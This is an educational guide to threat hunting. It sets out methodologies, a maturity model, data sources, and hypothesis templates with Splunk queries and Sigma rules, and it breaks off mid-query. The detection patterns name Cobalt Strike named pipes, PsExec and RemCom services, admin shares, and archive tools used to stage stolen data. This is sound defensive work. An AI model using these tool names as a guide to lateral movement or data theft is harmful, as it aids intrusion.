# 07 - Threat Hunting
## Comprehensive Guide: Methodologies, Hypotheses, Data Sources, and Detection Queries

---

## Table of Contents
1. [Threat Hunting Fundamentals](#threat-hunting-fundamentals)
2. [Hunting Methodologies](#hunting-methodologies)
3. [Hunting Maturity Model](#hunting-maturity-model-hmm)
4. [Data Sources Priority Matrix](#data-sources-for-hunting)
5. [Hypothesis Templates with Queries](#hunting-hypothesis-templates)
6. [Hunt Documentation Templates](#hunt-documentation-templates)
7. [Metrics and KPIs](#hunting-metrics-and-kpis)
8. [Interview Questions](#interview-questions---threat-hunting)

---

## Threat Hunting Fundamentals

### What is Threat Hunting?

```
DEFINITION:
Threat hunting is the proactive, iterative search through networks and
datasets to detect and isolate advanced threats that evade existing
security solutions.

KEY CHARACTERISTICS:
├── PROACTIVE: Not waiting for alerts; actively seeking threats
├── ITERATIVE: Continuous refinement of hypotheses and techniques
├── HUMAN-DRIVEN: Leverages analyst intuition and expertise
├── HYPOTHESIS-BASED: Starts with educated assumptions
└── INTELLIGENCE-INFORMED: Uses threat intel to guide focus

HUNTING vs. DETECTION:
┌─────────────────────┬────────────────────┬─────────────────────────┐
│ Aspect              │ Threat Hunting     │ Traditional Detection   │
├─────────────────────┼────────────────────┼─────────────────────────┤
│ Approach            │ Proactive          │ Reactive                │
│ Trigger             │ Hypothesis         │ Alert/Signature         │
│ Coverage            │ Unknown threats    │ Known threats           │
│ Automation          │ Analyst-driven     │ Tool-driven             │
│ Output              │ New detections     │ Incident response       │
│ Frequency           │ Scheduled/Ongoing  │ Real-time               │
└─────────────────────┴────────────────────┴─────────────────────────┘
```

### The Hunting Mindset

```
ASSUME BREACH:
├── Your environment is already compromised
├── Existing controls have gaps
├── Attackers are actively evading detection
└── You must find what automated tools miss

THINK LIKE AN ATTACKER:
├── What would I target? (Crown jewels)
├── How would I get in? (Attack surface)
├── How would I move? (Lateral movement paths)
├── How would I persist? (Persistence mechanisms)
├── How would I hide? (Defense evasion)
└── How would I exfiltrate? (Data paths)

HUNTER'S QUESTIONS:
1. What SHOULD be happening on this system?
2. What SHOULDN'T be happening?
3. What's UNUSUAL compared to baseline?
4. What would an attacker NEED to do here?
5. What evidence would that leave?
```

---

## Hunting Methodologies

### 1. Hypothesis-Driven Hunting

```
OVERVIEW:
Most mature hunting approach. Start with an educated assumption about
attacker behavior, then search for evidence to prove or disprove it.

PROCESS:
┌─────────────────────────────────────────────────────────────────────┐
│ Step 1: HYPOTHESIS FORMULATION                                      │
│ "APT actors targeting our sector are using scheduled tasks for      │
│ persistence on domain controllers after initial compromise"         │
├─────────────────────────────────────────────────────────────────────┤
│ Step 2: DATA IDENTIFICATION                                         │
│ - Windows Security Event 4698 (Scheduled task created)              │
│ - Sysmon Event 1 (Process creation by schtasks.exe)                 │
│ - Task Scheduler operational logs                                   │
│ - Registry: HKLM\SOFTWARE\Microsoft\Windows NT\Schedule             │
├─────────────────────────────────────────────────────────────────────┤
│ Step 3: ANALYTICS DEVELOPMENT                                       │
│ - Query for task creation on DCs outside change windows             │
│ - Filter for non-standard task paths                                │
│ - Correlate with authentication anomalies                           │
├─────────────────────────────────────────────────────────────────────┤
│ Step 4: INVESTIGATION                                               │
│ - Analyze query results                                             │
│ - Pivot on interesting findings                                     │
│ - Document false positives and true positives                       │
├─────────────────────────────────────────────────────────────────────┤
│ Step 5: RESPONSE                                                    │
│ - Escalate true positives to IR                                     │
│ - Document legitimate activity for whitelisting                     │
├─────────────────────────────────────────────────────────────────────┤
│ Step 6: ITERATION                                                   │
│ - Refine hypothesis based on findings                               │
│ - Create automated detection rule                                   │
│ - Document for future hunts                                         │
└─────────────────────────────────────────────────────────────────────┘

HYPOTHESIS SOURCES:
├── Threat Intelligence Reports
│   └── "APT29 uses WMI for persistence" → Hunt for WMI subscriptions
├── ATT&CK Gap Analysis
│   └── "No detection for T1053.005" → Hunt for scheduled tasks
├── Recent Incidents
│   └── "Phishing led to credential theft" → Hunt for similar patterns
├── Industry Trends
│   └── "Ransomware targeting healthcare" → Hunt for staging behavior
└── Red Team Findings
    └── "Pentest used Rubeus" → Hunt for Kerberos anomalies
```

### 2. Intelligence-Driven Hunting

```
OVERVIEW:
Use specific threat intelligence (IOCs, TTPs, campaigns) to guide
hunting activities. Most effective against known threats.

PROCESS:
┌─────────────────────────────────────────────────────────────────────┐
│ 1. INTEL INGESTION                                                  │
│    ├── Threat reports (Mandiant, CrowdStrike, CISA)                │
│    ├── IOC feeds (VirusTotal, OTX, MISP)                           │
│    ├── ISAC/ISAO advisories                                        │
│    └── Dark web monitoring                                          │
├─────────────────────────────────────────────────────────────────────┤
│ 2. INTEL ANALYSIS                                                   │
│    ├── Extract actionable IOCs (hashes, IPs, domains)              │
│    ├── Identify TTPs and behavioral patterns                        │
│    ├── Map to ATT&CK techniques                                     │
│    └── Assess relevance to your environment                         │
├─────────────────────────────────────────────────────────────────────┤
│ 3. HUNT EXECUTION                                                   │
│    ├── Search for specific IOCs                                     │
│    ├── Hunt for TTP patterns                                        │
│    ├── Look for related infrastructure                              │
│    └── Expand scope based on findings                               │
├─────────────────────────────────────────────────────────────────────┤
│ 4. DETECTION CREATION                                               │
│    ├── Signature-based rules for IOCs                               │
│    ├── Behavioral rules for TTPs                                    │
│    └── Update threat intel platform                                 │
└─────────────────────────────────────────────────────────────────────┘

INTEL-DRIVEN HUNT EXAMPLE:

INTEL: CISA Advisory on APT targeting critical infrastructure
       using Cobalt Strike with specific C2 patterns

HUNT STEPS:
1. Search for known Cobalt Strike IOCs
   - IP addresses, domains, SSL certificates

2. Hunt for Cobalt Strike behavioral patterns
   - Named pipes: \\.\pipe\msagent_*, \\.\pipe\MSSE-*
   - Default sleep time patterns (60s with jitter)
   - malleable C2 profile indicators

3. Hunt for associated TTPs
   - Service creation for persistence
   - Credential dumping from LSASS
   - Lateral movement via SMB/WMI

4. Create detections for future activity
```

### 3. Situational Awareness Hunting

```
OVERVIEW:
Hunt based on understanding of your environment's critical assets,
attack surface, and detection gaps. "What are we blind to?"

COMPONENTS:
┌─────────────────────────────────────────────────────────────────────┐
│ CROWN JEWEL ANALYSIS                                                │
│ ├── What are our most valuable assets?                              │
│ │   ├── Customer PII databases                                      │
│ │   ├── Intellectual property repositories                          │
│ │   ├── Financial systems                                           │
│ │   └── Domain controllers                                          │
│ ├── Where do they reside?                                           │
│ ├── Who has access?                                                 │
│ └── What would compromise look like?                                │
├─────────────────────────────────────────────────────────────────────┤
│ ATTACK SURFACE MAPPING                                              │
│ ├── External exposure (VPNs, webapps, APIs)                        │
│ ├── Internal segmentation gaps                                      │
│ ├── Third-party connections                                         │
│ └── Shadow IT and unmanaged devices                                 │
├─────────────────────────────────────────────────────────────────────┤
│ DETECTION GAP ANALYSIS                                              │
│ ├── ATT&CK coverage assessment                                      │
│ ├── Log source gaps                                                 │
│ ├── Visibility blind spots                                          │
│ └── Rule coverage gaps                                              │
├─────────────────────────────────────────────────────────────────────┤
│ HUNT IN BLIND SPOTS                                                 │
│ ├── Areas without EDR coverage                                      │
│ ├── Encrypted traffic paths                                         │
│ ├── Cloud workloads without monitoring                              │
│ └── Legacy systems with limited logging                             │
└─────────────────────────────────────────────────────────────────────┘
```

### 4. SQRRL Hunting Loop

```
THE LOOP:
                    ┌──────────────┐
                    │  HYPOTHESIS  │
                    └──────┬───────┘
                           │
            ┌──────────────▼──────────────┐
            │                             │
    ┌───────▼───────┐             ┌───────▼───────┐
    │    INFORM     │             │  INVESTIGATE  │
    └───────┬───────┘             └───────┬───────┘
            │                             │
            └──────────────┬──────────────┘
                           │
                    ┌──────▼───────┐
                    │   UNCOVER    │
                    └──────────────┘

DETAILED PROCESS:

HYPOTHESIS:
├── Formulate based on intel, ATT&CK, environment knowledge
├── Should be specific and testable
└── Document the reasoning

INVESTIGATE:
├── Collect and analyze relevant data
├── Execute queries and analytics
├── Pivot based on initial findings
└── Document methodology

UNCOVER:
├── Identify malicious activity or new patterns
├── Differentiate true positives from false positives
├── Understand attacker TTPs
└── Scope the activity

INFORM:
├── Create new detections from findings
├── Update threat intelligence
├── Improve security posture
├── Generate new hypotheses
└── Return to HYPOTHESIS phase
```

### 5. Data-Driven Hunting

```
OVERVIEW:
Use statistical analysis and machine learning to identify anomalies
without a specific hypothesis. Good for discovering unknown unknowns.

TECHNIQUES:
┌─────────────────────────────────────────────────────────────────────┐
│ STATISTICAL ANALYSIS                                                │
│ ├── Baseline normal behavior                                        │
│ ├── Identify statistical outliers                                   │
│ ├── Frequency analysis (rare events)                                │
│ └── Time-series anomaly detection                                   │
├─────────────────────────────────────────────────────────────────────┤
│ STACK ANALYSIS                                                      │
│ ├── Group by attribute, count occurrences                          │
│ ├── Hunt the long tail (rare values)                                │
│ ├── Example: Stack process names, investigate rare ones             │
│ └── "Least frequency analysis"                                      │
├─────────────────────────────────────────────────────────────────────┤
│ CLUSTERING                                                          │
│ ├── Group similar entities together                                 │
│ ├── Identify entities that don't fit clusters                       │
│ ├── Example: Cluster user behavior, find anomalous users            │
│ └── Useful for insider threat detection                             │
├─────────────────────────────────────────────────────────────────────┤
│ MACHINE LEARNING                                                    │
│ ├── Supervised: Train on labeled malicious/benign                   │
│ ├── Unsupervised: Anomaly detection                                 │
│ └── Example: UEBA platforms                                         │
└─────────────────────────────────────────────────────────────────────┘

STACK HUNTING EXAMPLE (Splunk):

# Find rare parent-child process relationships
index=sysmon EventCode=1
| stats count by ParentImage, Image
| sort count
| head 50

# Find rare services installed
index=windows EventCode=7045
| stats count by ServiceName, ImagePath
| where count < 3
| sort count

# Find rare scheduled tasks
index=windows EventCode=4698
| stats count by TaskName
| where count = 1
```

---

## Hunting Maturity Model (HMM)

```
┌───────┬─────────────────────────────────────────────────────────────────┐
│ LEVEL │ DESCRIPTION                                                     │
├───────┼─────────────────────────────────────────────────────────────────┤
│ HMM-0 │ INITIAL                                                         │
│       │ ├── Rely primarily on automated alerting                        │
│       │ ├── No dedicated hunting capability                             │
│       │ ├── Reactive-only posture                                       │
│       │ └── Limited data collection                                     │
├───────┼─────────────────────────────────────────────────────────────────┤
│ HMM-1 │ MINIMAL                                                         │
│       │ ├── Use threat intel for IOC searches                           │
│       │ ├── Basic indicator matching                                    │
│       │ ├── Some ad-hoc hunting during incidents                        │
│       │ └── Limited to reactive searches                                │
├───────┼─────────────────────────────────────────────────────────────────┤
│ HMM-2 │ PROCEDURAL                                                      │
│       │ ├── Follow documented hunting procedures                        │
│       │ ├── Regular hunting cadence (weekly/monthly)                    │
│       │ ├── Some data analysis capabilities                             │
│       │ ├── Hunting based on known TTPs                                 │
│       │ └── Dedicated hunting time allocated                            │
├───────┼─────────────────────────────────────────────────────────────────┤
│ HMM-3 │ INNOVATIVE                                                      │
│       │ ├── Create custom analytics and hypotheses                      │
│       │ ├── Hypothesis-driven hunting                                   │
│       │ ├── Hunting produces new detections                             │
│       │ ├── Advanced data analysis (statistics, ML)                     │
│       │ ├── Dedicated threat hunting team                               │
│       │ └── Hunting metrics tracked and reported                        │
├───────┼─────────────────────────────────────────────────────────────────┤
│ HMM-4 │ LEADING                                                         │
│       │ ├── Automated hunting pipelines                                 │
│       │ ├── ML-assisted anomaly detection                               │
│       │ ├── Proactive threat research                                   │
│       │ ├── Contribute to threat intel community                        │
│       │ ├── Continuous improvement cycle                                │
│       │ └── Hunt findings drive security strategy                       │
└───────┴─────────────────────────────────────────────────────────────────┘

MATURITY ASSESSMENT CRITERIA:

┌────────────────────┬───────┬───────┬───────┬───────┬───────┐
│ Capability         │ HMM-0 │ HMM-1 │ HMM-2 │ HMM-3 │ HMM-4 │
├────────────────────┼───────┼───────┼───────┼───────┼───────┤
│ Hunting Frequency  │ None  │ Adhoc │ Weekly│ Daily │ Cont. │
│ Hypothesis Dev.    │ None  │ Basic │ Proc. │ Custom│ ML    │
│ Data Collection    │ Basic │ Some  │ Good  │ Comp. │ Adv.  │
│ Analytics          │ None  │ IOC   │ Rules │ Stats │ ML/AI │
│ Team Structure     │ None  │ Part  │ Shared│ Dedic.│ Spec. │
│ Detection Creation │ None  │ Rare  │ Some  │ Freq. │ Auto  │
│ Metrics            │ None  │ None  │ Basic │ Comp. │ Adv.  │
└────────────────────┴───────┴───────┴───────┴───────┴───────┘
```

---

## Data Sources for Hunting

### Priority Matrix

```
┌────────────────────────┬─────────┬────────────────────────────────────────┐
│ DATA SOURCE            │ RATING  │ HUNTING VALUE                          │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ EDR Telemetry          │ ★★★★★   │ Process trees, file ops, network,      │
│                        │         │ registry, injection, memory            │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Sysmon                 │ ★★★★★   │ Process creation, network, registry,   │
│                        │         │ file creation, DNS queries             │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Windows Security       │ ★★★★★   │ Authentication, privilege use,         │
│ Events                 │         │ object access, process creation        │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ PowerShell Logs        │ ★★★★★   │ Script block logging (4104),           │
│                        │         │ module logging, transcripts            │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Active Directory       │ ★★★★★   │ Kerberos activity, group changes,      │
│                        │         │ replication, GPO modifications         │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ DNS Logs               │ ★★★★☆   │ C2 communication, DGA detection,       │
│                        │         │ tunneling, domain categorization       │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Proxy/Web Logs         │ ★★★★☆   │ C2 patterns, exfiltration, user        │
│                        │         │ agent anomalies, beaconing             │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Cloud Audit Logs       │ ★★★★☆   │ API abuse, IAM changes, resource       │
│ (CloudTrail/Azure)     │         │ modification, data access              │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Email Gateway          │ ★★★★☆   │ Phishing patterns, attachment          │
│                        │         │ analysis, sender reputation            │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ NetFlow/IPFIX          │ ★★★☆☆   │ Beaconing detection, large             │
│                        │         │ transfers, connection patterns         │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Firewall Logs          │ ★★★☆☆   │ Blocked connections, policy            │
│                        │         │ violations, port scanning              │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ VPN Logs               │ ★★★☆☆   │ Unusual access times, geo-anomalies,   │
│                        │         │ impossible travel                      │
├────────────────────────┼─────────┼────────────────────────────────────────┤
│ Linux Auditd           │ ★★★☆☆   │ Command execution, file access,        │
│                        │         │ privilege escalation                   │
└────────────────────────┴─────────┴────────────────────────────────────────┘
```

### Data Source Details

```
ENDPOINT DATA:
┌─────────────────────────────────────────────────────────────────────────┐
│ EDR TELEMETRY                                                           │
│ ├── Process execution with full command line                            │
│ ├── Process tree and parent-child relationships                         │
│ ├── File system operations (create, modify, delete)                     │
│ ├── Registry modifications                                              │
│ ├── Network connections with process context                            │
│ ├── DLL/module loading                                                  │
│ ├── Memory operations (injection, hollowing)                            │
│ └── User context for all operations                                     │
├─────────────────────────────────────────────────────────────────────────┤
│ SYSMON (Critical Events for Hunting)                                    │
│ ├── Event 1:  Process creation (CRITICAL)                               │
│ ├── Event 3:  Network connection                                        │
│ ├── Event 7:  Image loaded (DLL)                                        │
│ ├── Event 8:  CreateRemoteThread (injection)                            │
│ ├── Event 10: ProcessAccess (LSASS access)                              │
│ ├── Event 11: FileCreate                                                │
│ ├── Event 12/13/14: Registry operations                                 │
│ ├── Event 17/18: Pipe created/connected                                 │
│ ├── Event 19/20/21: WMI activity                                        │
│ └── Event 22: DNS query                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ WINDOWS SECURITY EVENTS (Critical)                                      │
│ ├── 4624/4625: Logon success/failure                                    │
│ ├── 4648: Explicit credentials (lateral movement)                       │
│ ├── 4672: Special privileges assigned                                   │
│ ├── 4688: Process creation (with command line)                          │
│ ├── 4698/4702: Scheduled task created/modified                          │
│ ├── 4768/4769: Kerberos TGT/TGS requests                               │
│ ├── 4776: NTLM authentication                                           │
│ ├── 5136/5137: Directory service changes                                │
│ └── 7045: Service installation                                          │
└─────────────────────────────────────────────────────────────────────────┘

NETWORK DATA:
┌─────────────────────────────────────────────────────────────────────────┐
│ DNS LOGS                                                                │
│ ├── Query types: A, AAAA, TXT, MX, CNAME                               │
│ ├── Response codes: NXDOMAIN patterns                                   │
│ ├── Query volume and frequency                                          │
│ ├── Domain age and reputation                                           │
│ └── Subdomain entropy (DGA detection)                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ PROXY/WEB LOGS                                                          │
│ ├── URL patterns and categories                                         │
│ ├── User agent strings                                                  │
│ ├── Request/response sizes                                              │
│ ├── HTTP methods (POST for exfil)                                       │
│ ├── Connection timing (beaconing)                                       │
│ └── SSL/TLS metadata                                                    │
├─────────────────────────────────────────────────────────────────────────┤
│ NETFLOW/IPFIX                                                           │
│ ├── Connection metadata (src, dst, ports, bytes)                        │
│ ├── Session duration patterns                                           │
│ ├── Byte ratio (upload vs download)                                     │
│ └── Connection frequency                                                │
└─────────────────────────────────────────────────────────────────────────┘

IDENTITY DATA:
┌─────────────────────────────────────────────────────────────────────────┐
│ ACTIVE DIRECTORY                                                        │
│ ├── Authentication events (Kerberos, NTLM)                              │
│ ├── Group membership changes                                            │
│ ├── Password resets and account modifications                           │
│ ├── GPO changes                                                         │
│ ├── Replication events (DCSync detection)                               │
│ └── Service account activity                                            │
├─────────────────────────────────────────────────────────────────────────┤
│ CLOUD IAM (Azure AD, Okta, etc.)                                        │
│ ├── Sign-in events and locations                                        │
│ ├── MFA challenges and bypasses                                         │
│ ├── Application consent grants                                          │
│ ├── Role assignments                                                    │
│ └── Service principal activity                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Hunting Hypothesis Templates

### HYPOTHESIS 1: Credential Abuse - Off-Hours Authentication

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers using compromised credentials authenticate during non-business│
│ hours to avoid detection and blend in with lower activity periods.      │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1078 - Valid Accounts                                                  │
│ T1078.002 - Valid Accounts: Domain Accounts                             │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows Security 4624 (Successful Logon)                              │
│ - Windows Security 4625 (Failed Logon)                                  │
│ - VPN Authentication Logs                                               │
│ - Cloud Identity Logs (Azure AD, Okta)                                  │
├─────────────────────────────────────────────────────────────────────────┤
│ BASELINE                                                                │
│ - Normal working hours for your organization                            │
│ - User-specific schedules if available                                  │
│ - Time zones for remote workers                                         │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY:
index=windows EventCode=4624 LogonType IN (2,3,10)
| eval hour=strftime(_time, "%H")
| eval day_of_week=strftime(_time, "%u")
| eval is_offhours=if((hour<6 OR hour>20) OR day_of_week IN ("6","7"), 1, 0)
| where is_offhours=1
| stats count as auth_count,
        values(LogonType) as logon_types,
        values(src_ip) as source_ips,
        dc(Computer) as unique_hosts
  by TargetUserName
| where auth_count > 5
| lookup user_schedule TargetUserName OUTPUT expected_hours, is_shift_worker
| where is_shift_worker!="yes"
| sort - auth_count

SIGMA RULE:
title: Off-Hours Authentication Activity
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType:
            - 2
            - 3
            - 10
    timeframe: |
        (time.hour < 6 or time.hour > 20) or
        (date.dayofweek in (6, 7))
    condition: selection

INVESTIGATION STEPS:
1. Verify user's expected working hours and time zone
2. Check for PTO, travel, or legitimate remote work
3. Correlate source IP with known user locations
4. Review what the user accessed after authentication
5. Check for concurrent sessions from different locations
6. Look for failed attempts before successful auth (spray)
7. Review subsequent activity for signs of compromise
```

### HYPOTHESIS 2: Credential Abuse - Password Spraying

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are conducting password spraying attacks by attempting        │
│ common passwords against many accounts to avoid account lockouts.       │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1110.003 - Brute Force: Password Spraying                              │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows Security 4625 (Failed Logon)                                  │
│ - Windows Security 4771 (Kerberos Pre-Auth Failed)                      │
│ - Azure AD Sign-In Logs                                                 │
│ - VPN/Application Auth Logs                                             │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY:
index=windows EventCode=4625
| bucket _time span=1h
| stats dc(TargetUserName) as unique_users,
        count as total_failures,
        values(TargetUserName) as attempted_users,
        values(Status) as failure_reasons
  by IpAddress, _time
| where unique_users > 10 AND total_failures > 20
| eval spray_ratio = total_failures / unique_users
| where spray_ratio < 5
| sort - unique_users

# Enhanced - Detect slow spray
index=windows EventCode=4625
| bucket _time span=24h
| stats dc(TargetUserName) as unique_users,
        count as total_failures,
        earliest(_time) as first_seen,
        latest(_time) as last_seen
  by IpAddress
| eval duration_hours = (last_seen - first_seen) / 3600
| where unique_users > 50 AND duration_hours > 2
| sort - unique_users

SIGMA RULE:
title: Password Spraying Detection
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
    timeframe: 1h
    condition: selection | count(TargetUserName) by IpAddress > 10

INVESTIGATION STEPS:
1. Identify the source IP and determine if internal or external
2. Check if source IP is a known proxy or VPN endpoint
3. Review the targeted accounts for patterns (naming convention)
4. Check for successful authentication after failures
5. Correlate with other authentication systems
6. Review time distribution of attempts
```

### HYPOTHESIS 3: Lateral Movement - WMI Execution

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are using WMI (Windows Management Instrumentation) for        │
│ lateral movement as it's often less monitored than PsExec/SMB.          │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1047 - Windows Management Instrumentation                              │
│ T1021.006 - Remote Services: Windows Remote Management                  │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Sysmon Event 1 (Process Creation)                                     │
│ - Windows Security 4648 (Explicit Credentials)                          │
│ - Windows Security 4624 Type 3 (Network Logon)                          │
│ - WMI-Activity/Operational Log                                          │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Outbound WMI:
index=sysmon EventCode=1
| where Image="*\\wmic.exe" OR
        (Image="*\\powershell.exe" AND
         (CommandLine="*Invoke-WmiMethod*" OR
          CommandLine="*Get-WmiObject*" OR
          CommandLine="*Invoke-CimMethod*"))
| rex field=CommandLine "/node:(?<target_host>[^\s]+)"
| rex field=CommandLine "-ComputerName\s+(?<target_host>[^\s]+)"
| where isnotnull(target_host)
| stats count,
        values(CommandLine) as commands,
        values(User) as users,
        dc(target_host) as unique_targets
  by Computer
| where unique_targets > 3
| sort - unique_targets

SPLUNK QUERY - WMI Process Spawn (on target):
index=sysmon EventCode=1 ParentImage="*\\WmiPrvSE.exe"
| where NOT Image IN ("*\\WmiPrvSE.exe", "*\\WmiApSrv.exe",
                       "*\\scrcons.exe", "*\\mofcomp.exe")
| stats count,
        values(CommandLine) as commands,
        values(User) as users
  by Computer, Image
| sort - count

SIGMA RULE:
title: WMI Remote Process Creation
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection_wmic:
        Image|endswith: '\wmic.exe'
        CommandLine|contains: '/node:'
    selection_powershell:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Invoke-WmiMethod'
            - '-ComputerName'
            - 'Invoke-CimMethod'
    condition: selection_wmic or selection_powershell

INVESTIGATION STEPS:
1. Identify source and destination hosts
2. Verify if this is legitimate admin activity
3. Check user context - is this a privileged account?
4. Review what process was spawned on the target
5. Look for authentication events around the same time
6. Check for other lateral movement from same source
```

### HYPOTHESIS 4: Lateral Movement - RDP Activity

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are using RDP for lateral movement, potentially from          │
│ workstations that don't normally initiate RDP connections.              │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1021.001 - Remote Services: Remote Desktop Protocol                    │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows Security 4624 Type 10 (RemoteInteractive)                     │
│ - Windows Security 4778/4779 (Session Reconnect/Disconnect)             │
│ - Sysmon Event 3 (Network Connection to port 3389)                      │
│ - RDP Client Logs (TerminalServices-RDPClient)                          │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Unusual RDP Sources:
index=windows EventCode=4624 LogonType=10
| stats count as rdp_connections,
        dc(Computer) as unique_destinations,
        values(Computer) as destinations
  by IpAddress, TargetUserName
| lookup normal_rdp_sources IpAddress OUTPUT is_known_source
| where is_known_source!="yes"
| sort - unique_destinations

SPLUNK QUERY - RDP to Sensitive Systems:
index=windows EventCode=4624 LogonType=10
| lookup sensitive_systems Computer OUTPUT system_tier, criticality
| where criticality="high"
| stats count by TargetUserName, IpAddress, Computer, system_tier
| lookup admin_workstations IpAddress OUTPUT is_admin_workstation
| where is_admin_workstation!="yes"
| sort - count

SPLUNK QUERY - RDP Chain Detection:
index=windows EventCode=4624 LogonType=10
| transaction TargetUserName maxspan=1h
| where eventcount > 2
| eval rdp_chain = mvjoin(Computer, " -> ")
| table _time, TargetUserName, rdp_chain, eventcount

SIGMA RULE:
title: RDP Connection from Non-Administrative Source
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 10
    filter_known:
        IpAddress|startswith:
            - '10.1.50.'  # Admin VLAN
            - '10.1.51.'  # IT subnet
    condition: selection and not filter_known

INVESTIGATION STEPS:
1. Verify if source IP is an authorized admin workstation
2. Check if user is authorized for RDP access
3. Review RDP session timing and duration
4. Look for file transfer activity during session
5. Check for unusual commands executed during session
6. Identify if this is part of a lateral movement chain
```

### HYPOTHESIS 5: Lateral Movement - SMB and PsExec

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are using SMB-based tools (PsExec, SMB shares) for lateral    │
│ movement and remote execution across the network.                       │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1021.002 - Remote Services: SMB/Windows Admin Shares                   │
│ T1570 - Lateral Tool Transfer                                           │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows Security 4624 Type 3                                          │
│ - Windows Security 5140/5145 (Share Access)                             │
│ - Windows Security 7045 (Service Installation)                          │
│ - Sysmon Event 1 (Process Creation)                                     │
│ - Sysmon Event 17/18 (Pipe Created/Connected)                           │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - PsExec Detection:
index=windows EventCode=7045
| where ServiceName IN ("PSEXESVC", "RemComSvc", "csexecsvc", "PAExec*")
   OR ImagePath="*\\PSEXESVC.exe"
   OR ImagePath="*ADMIN$*"
| stats count by ServiceName, ImagePath, AccountName, Computer
| sort - count

SPLUNK QUERY - Admin Share Access:
index=windows EventCode=5140 ShareName IN ("\\\\*\\ADMIN$", "\\\\*\\C$", "\\\\*\\IPC$")
| stats count as access_count,
        dc(ShareName) as unique_shares,
        values(ShareName) as shares
  by SubjectUserName, IpAddress
| where access_count > 10
| sort - access_count

SPLUNK QUERY - Named Pipe Lateral Movement:
index=sysmon EventCode IN (17, 18)
| where PipeName IN ("\\PSEXESVC*", "\\RemCom*", "\\csexec*", "\\PAExec*",
                     "\\MSSE-*", "\\status_*", "\\msagent_*")
| stats count values(PipeName) by Computer, User, Image
| sort - count

SIGMA RULE:
title: PsExec Service Installation
status: experimental
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
    keywords:
        ServiceName|contains:
            - 'PSEXESVC'
            - 'RemComSvc'
            - 'csexec'
            - 'PAExec'
        ImagePath|contains:
            - 'ADMIN$'
            - 'PSEXESVC'
    condition: selection and keywords

INVESTIGATION STEPS:
1. Identify the source of the connection
2. Check if service installation is legitimate
3. Review what was executed via the service
4. Correlate with authentication events
5. Check for lateral movement to other systems
6. Look for data staging or exfiltration after access
```

### HYPOTHESIS 6: Data Staging and Exfiltration

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are staging data in common directories and using archive      │
│ utilities before exfiltration to cloud storage or external hosts.       │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1074 - Data Staged                                                     │
│ T1560 - Archive Collected Data                                          │
│ T1041 - Exfiltration Over C2 Channel                                    │
│ T1567 - Exfiltration Over Web Service                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Sysmon Event 1 (Process Creation - archive tools)                     │
│ - Sysmon Event 11 (File Created)                                        │
│ - Proxy/Web Logs (uploads to cloud storage)                             │
│ - DLP Logs                                                              │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Archive Tool Usage:
index=sysmon EventCode=1
| where Image IN ("*\\7z.exe", "*\\7za.exe", "*\\rar.exe",
                  "*\\WinRAR.exe", "*\\zip.exe", "*\\tar.exe")
   OR (Image="*\\powershell.exe" AND CommandLine="*Compress-Archive*")
| rex field=CommandLine "(?<archive_path>[A-Za-z]:\\\\[^\"]+\\.(?:zip|rar|7z|tar|gz))"
| where match(archive_path, "(?i)(temp|tmp|appdata|public|downloads)")
   OR match(CommandLine, "-p")  # Password protected
| stats count, values(CommandLine) as commands, values(archive_path) as archives
  by User, Computer
| where count > 2
| sort - count

SPLUNK QUERY - Large File Creation in Staging Directories:
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)(temp|tmp|appdata|public|recycle|programdata)")
